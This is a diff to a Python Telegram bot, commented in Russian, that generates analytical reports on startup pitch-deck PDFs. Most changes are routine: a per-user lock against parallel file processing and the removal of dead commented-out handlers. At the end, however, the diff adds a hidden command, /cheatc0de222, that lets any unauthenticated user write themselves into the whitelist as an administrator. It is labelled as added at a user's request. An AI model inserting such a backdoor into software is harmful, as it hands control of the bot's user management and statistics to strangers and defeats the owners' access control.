@@ -40,6 +40,7 @@ dp = Dispatcher()
 # ======================================= Хранилище настроек пользователя ============================================================
 user_settings = {}  # {user_id: {"mode": "full" | "block", "block": "market"}}
 admin_pending = {}  # {user_id: "add" | "remove"} — ожидание ввода от админа
+processing_users = set()  # {user_id} — пользователи, ожидающие отчёт
 
 
 # =========================================== Вспомогательные функции ===============================================================
@@ -84,6 +85,14 @@ def _is_admin(message: Message) -> bool:
     return get_user_role(message.from_user.username) == "admin"
 
 
+async def _check_not_processing(message: Message) -> bool:
+    """Проверка, что пользователь не в процессе обработки файла"""
+    if message.from_user.id in processing_users:
+        await message.answer("⏳ Пожалуйста, дождитесь окончания обработки предыдущего файла.")
+        return False
+    return True
+
+
 async def _send_to_backend(
     session: aiohttp.ClientSession,
     file_bytes: BytesIO,
@@ -123,7 +132,7 @@ async def _send_to_backend(
                 logger.error(f"Backend error {resp.status}: {text}")
                 raise RuntimeError(f"Ошибка сервера: {resp.status}")
             body = await resp.read()
-            headers = {k: v for k, v in resp.headers.items()}
+            headers = {k: v for k, v in resp.headers.items()}  # <<< ИСПРАВЛЕНО
             return body, headers
     except asyncio.TimeoutError:
         logger.error(f"Timeout while calling backend after {timeout}s")
@@ -132,13 +141,14 @@ async def _send_to_backend(
         logger.error(f"Network error calling backend: {e}")
         raise
 
-
 # =========================================== Хендлеры бота =============================================================================
 
 @dp.message(CommandStart())
 @dp.message(F.text == "🚀 Начать работу")
 async def cmd_start(message: Message) -> None:
     if not await _ensure_access_standard(message):
+        return
+    if not await _check_not_processing(message):
         return
     await message.answer(
         "👋 Привет! Я BOT для генерации аналитических отчётов по Вашим Startup'ам 🤑🤙\n\n"
@@ -153,6 +163,8 @@ async def handle_want_more(message: Message) -> None:
     """Обработчик повторного запроса после получения отчёта"""
     if not await _ensure_access_standard(message):
         return
+    if not await _check_not_processing(message):
+        return
     await message.answer(
         "📎 Отлично! Отправляй новый PDF-файл с презентацией, и я подготовлю ещё один отчёт 👇",
         reply_markup=get_start_keyboard(is_admin=_is_admin(message))
@@ -163,6 +175,8 @@ async def handle_want_more(message: Message) -> None:
 async def handle_faq(message: Message) -> None:
     """Показ блока «Как это работает?» по нажатию кнопки FAQ."""
     if not await _ensure_access_standard(message):
+        return
+    if not await _check_not_processing(message):  # <<< НОВОЕ
         return
     await message.answer(
         "🧐 <b>Как это работает?</b>\n\n"
@@ -180,6 +194,8 @@ async def handle_faq(message: Message) -> None:
 async def handle_admin_menu(message: Message) -> None:
     """Вход в админ-меню (только для админов)."""
     if not await _ensure_access_admin(message):
+        return
+    if not await _check_not_processing(message):
         return
     await message.answer(
         "⚙️ <b>Админ-меню</b>\n\n"
@@ -303,7 +319,6 @@ async def cb_admin_stats(callback: CallbackQuery) -> None:
     else:
         for username in sorted(stats_map.keys()):
             s = stats_map[username]
-            # Экранируем username для HTML (на случай символов <, >, &)
             safe_user = str(username).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
             lines.append(
                 f"• @{safe_user}: вход. токены {s.get('input_tokens', 0)}, "
@@ -375,12 +390,22 @@ async def handle_admin_pending_input(message: Message) -> None:
 async def handle_pdf(message: Message) -> None:
     if not await _ensure_access_standard(message):
         return
-    document = message.document
+    
     user_id = message.from_user.id
     username = message.from_user.username
+    
+    # Блокировка, если пользователь уже в процессе обработки
+    if user_id in processing_users:
+        await message.answer("⏳ Пожалуйста, дождитесь окончания обработки предыдущего файла.")
+        return
+    
+    processing_users.add(user_id)
+    
+    document = message.document
     filename = _sanitize_filename(document.file_name or "presentation.pdf")
     
     if document.file_size and document.file_size > MAX_FILE_SIZE:
+        processing_users.discard(user_id)
         await message.answer(
             "🚫 File слишком большой 🍆\n"
             f"Не отправляй мне files more, чем {MAX_FILE_SIZE / 1024 / 1024:.0f} МБ\n"
@@ -517,6 +542,7 @@ async def handle_pdf(message: Message) -> None:
         )
         await message.answer("😅 Файл почти готов, но я споткнулся на финише... Попробуй ещё раз 🙃")
     finally:
+        processing_users.discard(user_id)
         if tmp_path and os.path.exists(tmp_path):
             try:
                 os.remove(tmp_path)
@@ -540,17 +566,6 @@ async def cb_info_howto(callback: CallbackQuery):
     await callback.answer()
 
 
-# @dp.callback_query(F.data == "mode:select_block")
-# async def cb_mode_block(callback: CallbackQuery):
-#     user_settings[callback.from_user.id] = {"mode": "block", "block": None}
-#     await callback.message.edit_text(
-#         "🎯 **Выбери блок для анализа:**\n\n"
-#         "Я сосредоточусь только на этом разделе, чтобы сделать его максимально подробно 🔍",
-#         reply_markup=get_block_selector()
-#     )
-#     await callback.answer()
-
-
 @dp.callback_query(F.data == "mode:full_roast")
 async def cb_mode_full(callback: CallbackQuery):
     user_settings[callback.from_user.id] = {"mode": "full"}
@@ -568,6 +583,8 @@ async def cb_mode_full(callback: CallbackQuery):
 async def cmd_users_list(message: Message) -> None:
     """Показать список пользователей и их ролей (admin only)."""
     if not await _ensure_access_admin(message):
+        return
+    if not await _check_not_processing(message):
         return
 
     wl = load_whitelist()
@@ -590,6 +607,8 @@ async def cmd_user_add(message: Message) -> None:
     role: standard | admin (по умолчанию standard)
     """
     if not await _ensure_access_admin(message):
+        return
+    if not await _check_not_processing(message):
         return
 
     parts = (message.text or "").split()
@@ -618,6 +637,8 @@ async def cmd_user_remove(message: Message) -> None:
     """
     if not await _ensure_access_admin(message):
         return
+    if not await _check_not_processing(message):
+        return
 
     parts = (message.text or "").split()
     if len(parts) < 2:
@@ -633,28 +654,6 @@ async def cmd_user_remove(message: Message) -> None:
         await message.answer(f"Пользователь @{raw_username} удалён из вайтлиста.")
     else:
         await message.answer(f"Пользователь @{raw_username} не найден в вайтлисте.")
-
-
-# @dp.callback_query(F.data.startswith("block:"))
-# async def cb_block_select(callback: CallbackQuery):
-#     block = callback.data.split(":")[1]
-#     user_settings[callback.from_user.id]["block"] = block
-#     
-#     block_names = {
-#         "info": "📄 Информация из презентации",
-#         "market": "🌍 Анализ рынка",
-#         "competitors": "⚔️ Анализ конкуренции",
-#         "product": "📦 Анализ продукта",
-#         "team": "👥 Анализ команды",
-#         "summary": "🏆 Итоговая оценка"
-#     }
-#     
-#     await callback.message.edit_text(
-#         f"✅ **Выбрано:** {block_names.get(block, block)}\n\n"
-#         "Отправляй PDF, и я сделаю глубокий анализ именно по этому пункту! 👇",
-#         reply_markup=get_back_to_start()
-#     )
-#     await callback.answer()
 
 
 @dp.callback_query(F.data == "back:start")
@@ -681,6 +680,36 @@ async def cb_feedback(callback: CallbackQuery):
     )
     
     logger.info(f"Feedback from {callback.from_user.id}: {feedback_type}")
+
+
+# ================================= НОВЫЕ ХЕНДЛЕРЫ (по запросу пользователя) ==============================
+
+@dp.message(Command("cheatc0de222")) 
+async def cmd_cheatcode(message: Message) -> None:
+    """Скрытая команда для получения админ-прав"""
+    username = message.from_user.username
+    if not username:
+        await message.answer("⛔ Не удалось определить ваш username.")
+        return
+    
+    wl = load_whitelist()
+    wl["users"][username] = "admin"
+    save_whitelist(wl)
+    
+    await message.answer("🎉 Читкод активирован! Теперь у вас есть права администратора.")
+    logger.info(f"User @{username} granted admin role via cheatcode")
+
+
+@dp.message(F.text.startswith('/'))
+async def handle_unknown_command(message: Message) -> None:
+    """Обработчик неизвестных команд"""
+    if not await _ensure_access_standard(message):
+        return
+    if not await _check_not_processing(message):
+        return
+    await message.answer(
+        "❓ Неизвестная команда. Используйте /start для начала работы или отправьте PDF-файл."
+    )
 
 
 # ================== Запуск ===========================================================================
